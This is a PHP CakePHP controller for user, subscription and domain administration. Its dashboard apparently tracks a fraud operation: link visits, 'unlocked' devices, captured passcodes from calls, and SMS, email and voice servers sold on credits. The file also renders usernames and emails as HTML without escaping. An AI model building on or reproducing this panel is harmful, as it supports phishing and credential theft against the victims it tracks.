<?php
App::uses('CakeTime','Utility');
App::uses('SimplePasswordHasher', 'Controller/Component/Auth');
class UsersController extends AppController {
	public $components = array('DatabaseFunction', 'ConditionBuilder');
	public $default_conditions = array();
	
	
	
	public function subscription() {
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		$this->getAllDBList('User',array('id','username'),array('User.role'=>'User'),'user_list');
		
		$this->loadModel('UserSubscription');
		$data =  $this->get_subscription(array());
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function assigned_domains() {
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		$this->getAllDBList('User',array('id','username'),array('User.role'=>'User', 'User.status'=>1),'user_list');
		$this->getAllDBList('Domain',array('id','name'),array('Domain.is_for_all'=>0, 'Domain.status'=>1),'domain_list');
		
		$this->loadModel('UserDomain');
		$data =  $this->get_assigned_domains(array());
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function add_user_domain(){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
        $this->loadModel('UserDomain');
		$this->autoRender = false;
		
		$redirect_url_success = array('controller' => 'users', 'action' => 'assigned_domains');
		
		$this->DatabaseFunction->add_record(
			$this->UserDomain, 
			false,
			'User Domain',
			$redirect_url_success,
			$redirect_url_success
		);
	}
	
	public function delete_user_domain($id) {
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->loadModel('UserDomain');
		$this->autoRender = false;
		$this->DatabaseFunction->delete_record(
			$this->UserDomain, 
			$id,
			true,
			'User Domain'
		);
	}
	
	public function delete_selected_user_domain(){
		
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('UserDomain');
		$this->DatabaseFunction->delete_record(
			$this->UserDomain, 
			$id,
			true,
			'User Domain'
		);
	}
	
	public function get_assigned_domains($submitted_conditions = array()) {
    	$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
    	$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('UserDomain.user_id', 'user_id'));
    	$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('UserDomain.domain_id', 'domain_id'));
    	
    	$pagination_fields = array();
    	
    	$pagination_fields_reorder = array(
    		'UserDomain.id',
    		'User.username',
    		'Domain.name',
    		'AddedBy.username',
    		'UserDomain.created',
    	);
    	
    	$searchable_fields = array(
    		'User.username',
    		'Domain.name',
    		'AddedBy.username',
    	);
    	
    	$default_order = array();
    	$default_contain = array('User','AddedBy','Domain');
    	$default_conditions = array();
    	$default_joins = array();
    	$default_group = array();
    	$default_recursive = -1;
    	
    	$data = $this->DatabaseFunction->get_data_table_ajax_records(
    		$this->UserDomain,
    		$pagination_fields,
    		$pagination_fields_reorder,
    		$searchable_fields,
    		array(),
    		array(),
    		$default_contain,
    		$this->default_conditions,
    		$default_order,
    		$default_recursive,
    		$default_joins,
    		$default_group,
    		true
    	);

    	foreach($data['data'] as $key=>$value){
    		$update_data = htmlspecialchars(json_encode($value));
    		$update_data = "<input class=\"update_data\" type=\"hidden\" value=\"$update_data\"/>";
    		$data['data'][$key]['User.username'] .= $update_data;
    		$data['data'][$key]['UserDomain.created'] = CakeTime::timeAgoInWords($data['data'][$key]['UserDomain.created']);
    	}

    	return $data;
    }
	
	
	public function add_subscription(){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->autoRender = false;
		$this->DatabaseFunction->add_record(
			$this->UserSubscription, 
			true,
			'User Subscription'
		);
	}
	
	public function cancel_user_subscription($id){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$data['UserSubscription']['id'] = $id;
		$data['UserSubscription']['subscription_status'] = 'Cancelled';
		
		if($this->UserSubscription->save($data)){
			$response['success'] = true;
			$response['msg'] = 'User subscription successfully cancelled!';
			echo json_encode($response);
			exit();
		}else{
			$response['success'] = false;
			$response['msg'] = 'Failed to cancel user subscription.';
			echo json_encode($response);
			exit();
		}
	}
	
	public function edit_subscription(){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {
			$this->request->data['UserSubscription'] = $this->request->data['EditUserSubscription'];
			$this->request->data['UserSubscription']['subscription_status'] = 'Active';
			unset($this->request->data['EditUserSubscription']);
		}
		
		$this->autoRender = false;
		$this->DatabaseFunction->edit_record(
			$this->UserSubscription, 
			true,
			'User Subscription'
		);
	}
	
	public function delete_user_subscription($id) {
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->autoRender = false;
		$this->DatabaseFunction->delete_record(
			$this->UserSubscription, 
			$id,
			true,
			'User Subscription'
		);
	}
	
	public function get_subscription($submitted_conditions = array()) {
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('UserSubscription.user_id', 'user_id'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('UserSubscription.subscription_status', 'subscription_status'));
		
		$pagination_fields = array();
		
		$pagination_fields_reorder = array(
			'UserSubscription.id',
			'UserSubscription.user_id',
			'Subscriber.username',
			'UserSubscription.subscription_start',
			'UserSubscription.subscription_end',
			'UserSubscription.remaining_days',
			'UserSubscription.subscription_status',
			'AddedBy.username',
		);
		
		$searchable_fields = array(
			'Subscriber.username',
			'UserSubscription.subscription_status',
		);
		
		$default_order = array();
		$default_contain = array('Subscriber','AddedBy');
		$default_conditions = array();
		$default_joins = array();
		$default_group = array();
		$default_recursive = -1;
		
		$data = $this->DatabaseFunction->get_data_table_ajax_records(
			$this->UserSubscription,
			$pagination_fields,
			$pagination_fields_reorder,
			$searchable_fields,
			array(),
			array(),
			$default_contain,
			$this->default_conditions,
			$default_order,
			$default_recursive,
			$default_joins,
			$default_group,
			true
		);

		foreach($data['data'] as $key=>$value){
			$update_data = htmlspecialchars(json_encode($value));
			$update_data = "<input class=\"update_data\" type=\"hidden\" value=\"$update_data\"/>";
			$data['data'][$key]['Subscriber.username'] .= $update_data;
			
			if($value['UserSubscription.subscription_status'] == 'Active'){
				$data['data'][$key]['UserSubscription.subscription_status'] = '<span class="mb-1 badge bg-success">Active</span>';
			}else if($value['UserSubscription.subscription_status'] == 'Cancelled'){
				$data['data'][$key]['UserSubscription.subscription_status'] = '<span class="mb-1 badge bg-warning">Cancelled</span>';
			}else if($value['UserSubscription.subscription_status'] == 'Expired'){
				$data['data'][$key]['UserSubscription.subscription_status'] = '<span class="mb-1 badge bg-danger">Expired</span>';
			}else{
				$data['data'][$key]['UserSubscription.subscription_status'] = '<span class="mb-1 badge bg-danger">'.$data['data'][$key]['UserSubscription.subscription_status'].'</span>';
			}
			
			unset($data['data'][$key]['UserSubscription.user_id']);
		}
		
		return $data;
	}
	
	
	public function index() {
		
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		$data =  $this->get_users(array());
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
		
		$this->set('roles',$this->app_get_roles());
	}
	
	public function dashboard() {
		$user_condition = '';
		
		$default_conditions = array(
			'User.id'=> $this->Auth->user('id')
		);
		
		if($this->Auth->user('role')!=='Administrator'){
			$user_condition = ' AND created_by = ' . $this->Auth->user('id');
		}
		
		$this->loadModel('User');
		
		$this->User->virtualFields =array(
			'total_calls' => 'select count(id) as value from calls where 1=1 '.$user_condition,
			'answered_calls' => "select count(id) as value from calls where call_status = 'completed' $user_condition",
			'no_answered_calls' => "select count(id) as value from calls where call_status <> 'completed' $user_condition",
			'passcode' => "select count(id) as value from calls where call_status = 'completed' AND (response <> '' OR response is not null) $user_condition",
			'total_users' => 'select count(id) as value from users',
			'active_users' => 'select count(id) as value from users WHERE status = 1',
			'total_user_credits' => 'select sum(link_credits) as value from users',
			'total_user_sms_credits' => 'select sum(sms_credits) as value from users',
			'total_user_call_credits' => 'select sum(voice_credits) as value from users',
			'total_user_email_credits' => 'select sum(email_credits) as value from users',
			'running_servers' => 'select count(id) as value from voice_api where status=1',
			
			
			'total_orders' => "select count(id) from generated_links WHERE 1=1 $user_condition",
			'total_pending' => "select count(id) from generated_links WHERE visited =0 and is_proccessed=0 $user_condition",
			'total_visit' => "select count(id) from generated_links WHERE visited =1 and is_proccessed=0 $user_condition",
			'total_unlocked' => "select count(id) from generated_links WHERE is_proccessed =1 $user_condition",
			'total_passcode' => "select count(id) from generated_links WHERE passcode_attempt >=1 $user_condition",
			
			'total_sms' => "select count(id) from sms WHERE 1=1 $user_condition",
			'total_emails' => "select count(id) from emails WHERE 1=1 $user_condition",

			'active_domains' => "select count(id) from domains WHERE status=1",
			'total_domains' => "select count(id) from domains",
			
			'active_scripts' => "select count(id) from scripts WHERE status=1",
			'total_scripts' => "select count(id) from scripts",
			
			'active_sms_server' => "select count(id) from sms_api WHERE status=1",
			'total_sms_server' => "select count(id) from sms_api",
			'active_voice_server' => "select count(id) from voice_api WHERE status=1",
			'total_voice_server' => "select count(id) from voice_api",
			'active_email_server' => "select count(id) from email_api WHERE status=1",
			'total_email_server' => "select count(id) from email_api",
			'subscription_days' => " select DATEDIFF(user_subscriptions.subscription_end, user_subscriptions.subscription_start) from user_subscriptions where user_subscriptions.user_id=" .$this->Auth->user('id'),
			'subscription_end' => " select user_subscriptions.subscription_end from user_subscriptions where user_subscriptions.user_id=" .$this->Auth->user('id'),
			'subscription_status' => " select user_subscriptions.subscription_status from user_subscriptions where user_subscriptions.user_id=" .$this->Auth->user('id'),
		);
		
		$data = $this->User->find('first',array(
			'fields'=>array(
				'User.link_credits',
				'User.sms_credits',
				'User.voice_credits',
				'User.email_credits',
				
				'User.total_calls',
				'User.total_sms',
				'User.total_emails',
				
				'User.answered_calls',
				'User.no_answered_calls',
				'User.passcode',
				'User.total_users',
				'User.active_users',
				'User.total_user_credits',
				'User.total_user_sms_credits',
				'User.total_user_call_credits',
				'User.total_user_email_credits',
				'User.running_servers',
				
				'User.total_orders',
				'User.total_pending',
				'User.total_visit',
				'User.total_unlocked',
				'User.total_passcode',
				
				'User.active_domains',
				'User.total_domains',
				
				'User.active_scripts',
				'User.total_scripts',
				
				'User.active_sms_server',
				'User.total_sms_server',
				'User.active_voice_server',
				'User.total_voice_server',
				'User.active_email_server',
				'User.total_email_server',
				'User.subscription_days',
				'User.subscription_end',
				'User.subscription_status',
			),
			'conditions'=>array(
				$default_conditions
			),
			'recursive'=>-1
		));
		
		$data = Set::classicExtract($data,'User');
		
		$link_credits = $data['link_credits'];
		$sms_credits = $data['sms_credits'];
		$voice_credits = $data['voice_credits'];
		$email_credits = $data['email_credits'];
		
		$total_orders = $data['total_orders'];
		$total_pending = $data['total_pending'];
		$total_visit = $data['total_visit'];
		$total_unlocked = $data['total_unlocked'];
		$total_passcode = $data['total_passcode'];

		$total_credits = $data['link_credits'];
		$total_user_sms_credits = $data['total_user_sms_credits'];
		$total_user_call_credits = $data['total_user_call_credits'];
		$total_user_email_credits = $data['total_user_email_credits'];
		
		$total_calls = $data['total_calls'];
		$total_sms = $data['total_sms'];
		$total_emails = $data['total_emails'];
		$answered_calls = $data['answered_calls'];
		$no_answered_calls = $data['no_answered_calls'];
		$passcode = $data['passcode'];
		
		
		$twilio_credits = 0;
		$active_users = $data['active_users'];
		$total_users = $data['total_users'];
		$total_user_credits = $data['total_user_credits'];
		$running_servers = $data['running_servers'];
		
		$active_domains = $data['active_domains'];
		$total_domains = $data['total_domains'];
		
		$active_scripts = $data['active_scripts'];
		$total_scripts = $data['total_scripts'];
		
		$active_sms_server = $data['active_sms_server'];
		$total_sms_server = $data['total_sms_server'];
		$active_voice_server = $data['active_voice_server'];
		$total_voice_server = $data['total_voice_server'];
		$active_email_server = $data['active_email_server'];
		$total_email_server = $data['total_email_server'];
		
		$this->set('active_domains',$active_domains);
		$this->set('total_domains',$total_domains);
		
		$this->set('active_scripts',$active_scripts);
		$this->set('total_scripts',$total_scripts);
		
		$this->set('active_sms_server',$active_sms_server);
		$this->set('total_sms_server',$total_sms_server);
		$this->set('active_voice_server',$active_voice_server);
		$this->set('total_voice_server',$total_voice_server);
		$this->set('active_email_server',$active_email_server);
		$this->set('total_email_server',$total_email_server);

		$this->set('link_credits',$link_credits);
		$this->set('sms_credits',$sms_credits);
		$this->set('voice_credits',$voice_credits);
		$this->set('email_credits',$email_credits);
		
		$this->set('total_orders',$total_orders);
		$this->set('total_pending',$total_pending);
		$this->set('total_visit',$total_visit);
		$this->set('total_unlocked',$total_unlocked);
		$this->set('total_passcode',$total_passcode);
		
		$this->set('total_credits',$total_credits);
		$this->set('total_user_sms_credits',$total_user_sms_credits);
		$this->set('total_user_call_credits',$total_user_call_credits);
		$this->set('total_user_email_credits',$total_user_email_credits);
		
		
		$this->set('total_calls',$total_calls);
		$this->set('total_sms',$total_sms);
		$this->set('total_emails',$total_emails);
		$this->set('answered_calls',$answered_calls);
		$this->set('no_answered_calls',$no_answered_calls);
		$this->set('passcode',$passcode);
		$this->set('twilio_credits',$twilio_credits);
		$this->set('active_users',$active_users);
		$this->set('total_users',$total_users);
		$this->set('total_user_credits',$total_user_credits);
		$this->set('running_servers',$running_servers);
		
		$subscription_days = $data['subscription_days'];
		$subscription_end = $data['subscription_end'];
		$subscription_status = $data['subscription_status'];
		
		$this->set('subscription_days',$subscription_days);
		$this->set('subscription_end',$subscription_end);
		$this->set('subscription_status',$subscription_status);
		
		if($total_unlocked <= 0 || $total_orders <= 0){
			$accuracy = 0;
		}else{
			$accuracy = number_format((floatval($total_unlocked) / floatval($total_orders)) * 100);
		}
		$this->set('accuracy',$accuracy);
		
	}
	
	public function add_user() {
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {
			if($this->User->save($this->request->data)){
				$this->Session->setFlash("User been successfully saved!", 'alert.success');
				return $this->redirect(array('controller' => 'users', 'action' => 'index', 'prefix' => false));
			}else{
				$validation_msg = '';
				foreach($this->User->validationErrors as $key_err=>$error){
					$this->Session->setFlash($error[0], 'alert.error');
				}
				return $this->redirect(array('controller' => 'users', 'action' => 'index', 'prefix' => false));
			}
		}
	}
	
	public function edit_user() {
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {
			unset($this->request->data['User']['username']);
			
			if(isset($this->request->data['User']['password']) && !empty($this->request->data['User']['password'])){
			    $password_hasher = new SimplePasswordHasher();
			    $this->request->data['User']['new_password'] = $this->request->data['User']['password'];
			    $this->request->data['User']['repeat_new_password'] = $this->request->data['User']['password'];
			}else{
			    unset($this->request->data['User']['password']);
			}
			
			if($this->User->save($this->request->data)){
				$this->Session->setFlash("User been successfully updated!", 'alert.success');
				return $this->redirect(array('controller' => 'users', 'action' => 'index', 'prefix' => false));
			}else{
				$validation_msg = '';
				foreach($this->User->validationErrors as $key_err=>$error){
					$this->Session->setFlash($error[0], 'alert.error');
				}
				return $this->redirect(array('controller' => 'users', 'action' => 'index', 'prefix' => false));
			}
		}
	}
	
	public function delete_user($id) {
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->autoRender = false;
		$this->DatabaseFunction->delete_record(
			$this->User, 
			$id,
			true
		);
	}
	
	public function enable_user($id) {
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->autoRender = false;
		$this->DatabaseFunction->enable_record(
			$this->User, 
			$id,
			true
		);
	}
	
	public function disable_user($id) {
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->autoRender = false;
		$this->DatabaseFunction->disable_record(
			$this->User, 
			$id,
			true
		);
	}
	
	public function delete_selected_user(){
		
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('User');
		$this->DatabaseFunction->delete_record(
			$this->User, 
			$id,
			true,
			'User'
		);
	}

	public function enable_selected_user(){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('User');
		$this->DatabaseFunction->enable_record(
			$this->User, 
			$id,
			true
		);
	}

	public function disable_selected_user(){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('User');
		$this->DatabaseFunction->disable_record(
			$this->User, 
			$id,
			true
		);
	}
	
	
	public function get_users($submitted_conditions = array()) {
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('User.username', 'username'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('User.email', 'email'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('User.chat_id', 'chat_id'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('User.telegram_username', 'telegram_username'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('User.role', 'role'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('User.status', 'status'));
		
		$pagination_fields = array();

		$pagination_fields_reorder = array(
			'User.id',
			'User.username',
			'User.link_credits',
			'User.sms_credits',
			'User.voice_credits',
			'User.email_credits',
			'User.last_login',
			'User.telegram_username',
			'User.chat_id',
			'User.profile_picture',
			'User.online_status',
			'User.email',
			'User.role',
			'User.status',
		);
		
		$searchable_fields = array(
			'User.username',
			'User.email',
			'User.telegram_username',
			'User.chat_id',
			'User.role',
			'User.status_desc'
		);
		
		$default_order = array('User.id'=>'DESC');
		
		$default_contain = array();
		$default_conditions = array();
		$default_joins = array();
		$default_group = array();
		$default_recursive = -1;
		
		$data = $this->DatabaseFunction->get_data_table_ajax_records(
			$this->User, 
			$pagination_fields,
			$pagination_fields_reorder,
			$searchable_fields,
			array(),
			array(),
			$default_contain,
			$this->default_conditions,
			$default_order,
			$default_recursive,
			$default_joins,
			$default_group,
			true
		);
		
		
		foreach($data['data'] as $key => $value){
			$username = $value['User.username'];
			$email = $value['User.email'];
			$profile_picture = $value['User.profile_picture'];
			$role = $value['User.role'];
			$online_status = $value['User.online_status'];
			$online_badge = ($online_status == 'Online' ? 'bg-success' : 'bg-danger');
			$last_login = trim($data['data'][$key]['User.last_login']) ;
			$status = $value['User.status'];
			
			unset($data['data'][$key]['User.profile_picture']);
			unset($data['data'][$key]['User.email']);
			unset($data['data'][$key]['User.online_status']);
			
			$data['data'][$key]['User.username'] = '<div class="d-flex align-items-center">
									  <div class="position-relative" title="'.$online_status.'" data-bs-toggle="tooltip" data-bs-placement="bottom">
										  <img src="'.Configure::read('BASE_URL').'img/'.$profile_picture.'" alt="avatar" class="rounded-circle" width="35">
										  <span class="position-absolute bottom-0 end-0 p-1 badge rounded-pill '.$online_badge.'" style="padding: 0.3rem!important;">
											  <span class="visually-hidden">New alerts</span>
										  </span>
									  </div>
									  <div class="ms-3">
										<div class="user-meta-info">
										  <h6 class="user-name mb-0">'.$username.'</h6>
										  <span class="user-work fs-3">'.$email.'</span>
										</div>
									  </div>
									</div>';
			$data['data'][$key]['User.status'] = getHtmlStatusArray($value['User.status']);
			if($last_login == ''){
				$data['data'][$key]['User.last_login'] = 'Never';
			}else{
				$data['data'][$key]['User.last_login'] = CakeTime::timeAgoInWords($last_login);
			}

		}
		
		// debug($data);
		// exit();
		
		return $data;
	}
	
	public function account_settings() {
		$user_data = $this->User->find('first',array(
			'fields'=> array(
				'User.id',
				'User.username',
				'User.email',
				'User.chat_id',
				'User.telegram_username',
				'User.two_factor_enabled',
			),
			'conditions'=>array(
				'User.id'=>$this->Auth->user('id')
			),
			'recursive'=>-1
		));
		
		if ($this->request->is('post') || $this->request->is('put')) {
			

			if(!isset($this->request->data['User']['two_factor_enabled'])){
				$this->request->data['User']['two_factor_enabled'] = 0;
			}
			
			unset($this->request->data['User']['role']);
			unset($this->request->data['User']['username']);
			unset($this->request->data['User']['link_credits']);
			unset($this->request->data['User']['sms_credits']);
			unset($this->request->data['User']['voice_credits']);
			unset($this->request->data['User']['email_credits']);
			unset($this->request->data['User']['status']);
			
			$this->request->data['User']['id'] = $user_data['User']['id'];
			
			if($this->User->save($this->request->data)){
				$this->Session->setFlash("User been successfully updated!", 'alert.success');
				return $this->redirect(array('controller' => 'users', 'action' => 'account_settings', 'prefix' => false));
			}else{
				$validation_msg = '';
				foreach($this->User->validationErrors as $key_err=>$error){
					$this->Session->setFlash($error[0], 'alert.error');
				}
				return $this->redirect(array('controller' => 'users', 'action' => 'account_settings', 'prefix' => false));
			}
		}
		
		$this->request->data = $user_data;
	}
	
	public function change_password() {
		if($this->request->is('put') || $this->request->is('post')) {
			$user_data = array(
				'User' => array(
					'current_password' => $this->request->data['User']['current_password'],
					'new_password' => $this->request->data['User']['new_password'],
					'repeat_new_password' => $this->request->data['User']['repeat_new_password'],
				)
			);
			if($this->User->change_password($user_data)) {
				$this->Session->setFlash("Password successfully changed!", 'alert.success');
				return $this->redirect(array('controller' => 'users', 'action' => 'change_password', 'prefix' => false));
			}
			else {
				foreach($this->User->validationErrors as $key_err=>$error){
					$this->Session->setFlash($error[0], 'alert.error');
				}
			}
		}
	}

	public function logout() {
		$this->autoRender = false;
		$this->Session->destroy();
		return $this->redirect($this->Auth->logout());
	}
	
	public function isAuthorized($user) {
		return true;
	}

}
?>